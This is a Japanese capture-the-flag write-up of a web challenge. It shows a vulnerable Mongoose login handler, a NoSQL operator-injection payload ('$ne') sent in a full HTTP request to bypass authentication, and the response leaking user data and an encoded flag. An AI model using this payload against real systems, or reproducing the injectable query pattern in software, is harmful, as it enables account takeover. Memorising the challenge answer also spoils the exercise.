---
title: "No Sql Injection"
points: 200
tags: ["web"]
---

ログインページが表示される。渡されたコードをざざっと眺めてみると、ログインをバイパスしてadmin画面に行ければ良いという方針が立つ。

ログイン処理のコードは以下の通り。

```ts
import User from "@/models/user";
import { connectToDB } from "@/utils/database";
import { seedUsers } from "@/utils/seed";

export const POST = async (req: any) => {
  const { email, password } = await req.json();
  try {
    await connectToDB();
    await seedUsers();
    const users = await User.find({
      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
    });

    if (users.length < 1)
      return new Response("Invalid email or password", { status: 401 });
    else {
      return new Response(JSON.stringify(users), { status: 200 });
    }
  } catch (error) {
    return new Response("Internal Server Error", { status: 500 });
  }
};
```

`{` で始まって `}` で終わる場合には、`JSON.parse` した結果が渡されることがわかる。

./modelsディレクトリを眺めてみると、`mongoose` というライブラリを使っていることがわかる。

ドキュメントを眺めてみると、何かしら条件式が渡せそうなことに気づく。

- https://mongoosejs.com/docs/api/model.html#Model.find()

ドキュメントを見ながら以下のようなペイロードを送ってみる。

```
POST /api/login HTTP/1.1
Host: atlas.picoctf.net:63191
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://atlas.picoctf.net:63191
Referer: http://atlas.picoctf.net:63191/
Accept-Encoding: gzip, deflate
Accept-Language: ja-JP,ja;q=0.9
Content-Length: 50

{"email":"{\"$ne\": 0}","password":"{\"$ne\": 0}"}
```

レスポンスはこんな感じで、帰ってきたtokenをbase64でデコードしたら終わり。

```
HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
content-type: text/plain;charset=UTF-8
date: Thu, 28 Mar 2024 19:16:52 GMT
connection: close
Content-Length: 237

[{
    "_id": "65f08c7b410684fbd599d448",
    "email": "joshiriya355@mumbama.com",
    "firstName": "Josh",
    "lastName": "Iriya",
    "password": "Je80T8M7sUA",
    "token": "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==",
    "__v": 0
}]
```